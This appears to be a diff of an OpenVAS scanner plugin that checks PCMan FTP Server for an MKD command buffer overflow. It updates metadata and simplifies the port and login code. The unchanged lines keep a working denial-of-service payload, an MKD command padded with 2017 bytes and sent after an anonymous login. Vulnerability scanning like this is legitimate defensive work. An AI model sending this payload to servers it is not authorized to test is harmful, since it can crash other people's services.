@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_pcman_ftp_server_mkd_command_bof_vuln.nasl 6551 2017-07-06 09:58:21Z teissa $
+# $Id: gb_pcman_ftp_server_mkd_command_bof_vuln.nasl 9552 2018-04-20 12:17:18Z cfischer $
 #
 # PCMAN FTP Server MKD Command Buffer Overflow vulnerability
 #
@@ -27,10 +27,10 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805050");
-  script_version("$Revision: 6551 $");
+  script_version("$Revision: 9552 $");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-06 11:58:21 +0200 (Thu, 06 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-04-20 14:17:18 +0200 (Fri, 20 Apr 2018) $");
   script_tag(name:"creation_date", value:"2015-02-25 12:32:52 +0530 (Wed, 25 Feb 2015)");
   script_name("PCMAN FTP Server MKD Command Buffer Overflow vulnerability");
 
@@ -67,60 +67,34 @@ if (description)
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("FTP");
-  script_dependencies("secpod_ftp_anonymous.nasl");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl");
   script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available");
+
   exit(0);
 }
-
-
-##
-## The script code starts here
-##
 
 include("ftp_func.inc");
 
-## Variable Initialization
-ftplogin = "";
-ftpPort = "";
-banner = "";
-user = "";
-pass = "";
-soc = "";
-
-## Get the ftp port from KB
-ftpPort = get_kb_item("Services/ftp");
-if(!ftpPort){
-  ftpPort = 21;
-}
-
-## Check Port status
-if(!get_port_state(ftpPort)){
-  exit(0);
-}
-
-## Confirm the Application
+ftpPort = get_ftp_port(default:21);
 banner = get_ftp_banner(port:ftpPort);
 if("220 PCMan's FTP Server" >!< banner){
   exit(0);
 }
 
-## Get Username from KB, If not given use default Username
 user = get_kb_item("ftp/login");
 if(!user){
   user = "anonymous";
 }
 
-## Get Password from KB, If not given use default Password
 pass = get_kb_item("ftp/password");
 if(!pass){
   pass = "anonymous";
 }
 
-## Open the socket
 soc = open_sock_tcp(ftpPort);
 if(!soc) exit(0);
 
-## Login to the ftp server
 ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
 if(!ftplogin)
 {
@@ -128,18 +102,12 @@ if(!ftplogin)
   exit(0);
 }
 
-## Construct the crafted request
 PAYLOAD = crap(data: "\x41", length:2017);
-
-## Send specially crafted MKD command
 send(socket:soc, data:string("MKD", PAYLOAD, '\r\n'));
-
-## Close FTP Socket
 ftp_close(socket:soc);
 
 sleep(3);
 
-## Confirm the Exploit by opening socket
 soc = open_sock_tcp(ftpPort);
 if(!soc)
 {
@@ -147,7 +115,6 @@ if(!soc)
   exit(0);
 }
 
-## Confirm the Exploit by login
 ftplogin = ftp_log_in(socket:soc, user:user, pass:pass);
 if(!ftplogin)
 {
